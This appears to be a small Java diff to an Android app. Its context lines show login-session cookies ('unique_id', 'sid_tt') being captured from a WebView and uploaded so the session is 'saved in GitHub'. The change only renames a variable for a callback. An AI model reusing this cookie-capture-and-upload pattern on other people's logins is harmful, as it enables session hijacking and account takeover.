@@ -360,6 +360,7 @@ public class MainActivity extends AppCompatActivity {
             // استخرج من الكوكيز إن أمكن (مثل unique_id cookie أو sid_tt)
             uniqueId = cookies.getOrDefault("unique_id", cookies.getOrDefault("sid_tt", "user"));
         }
+        final String finalCaptureUniqueId = uniqueId;
 
         // بناء JSON payload
         try {
@@ -404,7 +405,7 @@ public class MainActivity extends AppCompatActivity {
                         if (code == 200) {
                             toast("✅ تم التقاط الجلسة وحفظها في GitHub!");
                             // احفظ unique_id للاستخدام لاحقاً
-                            prefs.edit().putString("last_unique_id", uniqueId).apply();
+                            prefs.edit().putString("last_unique_id", finalCaptureUniqueId).apply();
                             // أغلق WebView بعد نجاح الالتقاط
                             closeLoginWebView();
                         } else {
